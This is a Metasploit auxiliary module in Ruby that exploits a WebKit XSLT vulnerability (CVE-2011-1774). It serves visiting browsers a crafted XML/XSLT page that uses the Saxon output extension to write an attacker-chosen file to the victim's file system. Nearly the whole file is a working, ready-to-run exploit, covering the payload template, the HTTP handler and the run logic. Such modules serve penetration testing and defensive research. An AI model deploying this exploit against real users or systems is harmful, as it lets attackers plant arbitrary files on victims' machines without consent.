##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Cross Platform Webkit File Dropper',
      'Description' => %q{
          This module exploits a XSLT vulnerability in Webkit to drop ASCII or UTF-8
        files to the target file-system.  By default, the file will be dropped in
        C:\Program Files\
      },
      'Author'      => [ 'Nicolas Gregoire' ],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'WebServer' ]
        ],
      'PassiveActions' =>
        [
          'WebServer'
        ],
      'DefaultAction'  => 'WebServer'))

    register_options(
      [
        OptString.new('REMOTE_PATH', [ true, "Location of the remote file", 'flag.txt' ]),
        OptString.new('REMOTE_CONTENT', [ true, "Content of the remote file", 'Hello from CVE-2011-1774' ])
      ], self.class)
  end

  def on_request_uri(cli, request)
    path  = datastore['REMOTE_PATH']
    content  = datastore['REMOTE_CONTENT']
    html = <<-EOS
<?xml-stylesheet type="text/xml" href="#fragment"?>
<!-- Define the DTD of the document
     This is needed, in order to later reference the XSLT stylesheet by a #fragment
     This trick allows to have both the XML and the XSL in the same file
     Cf. http://scarybeastsecurity.blogspot.com/2011/01/harmless-svg-xslt-curiousity.html -->
<!DOCTYPE doc [
 <!ATTLIST xsl:stylesheet
 id ID #REQUIRED
>]>
<doc>

<!-- Define location and content of the file -->
<path><![CDATA[#{path}]]></path>
<content><![CDATA[#{content}]]></content>

<!-- The XSLT stylesheet header, including the "sx" extension -->
<xsl:stylesheet id="fragment" version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:sx="http://icl.com/saxon"
  extension-element-prefixes="sx"
  xmlns="http://www.w3.org/1999/xhtml" >
<xsl:output method="xml" indent="yes" />

<!-- The XSLT template -->
<xsl:template match="/">
        <!-- Create the file -->
        <xsl:variable name="path" select="//path/text()"/>
        <sx:output file="{$path}" method="text">
                <xsl:value-of select="//content"/>
        </sx:output>
        <!-- Send some output to the browser -->
        <html> </html>
</xsl:template>
</xsl:stylesheet>
</doc>
EOS

    print_status("Sending XSLT payload ...")
    print_status("Destination file : #{path}")
    send_response_html(cli, html, { 'Content-Type' => 'application/xml' })
  end

  def run
    exploit()
  end

end
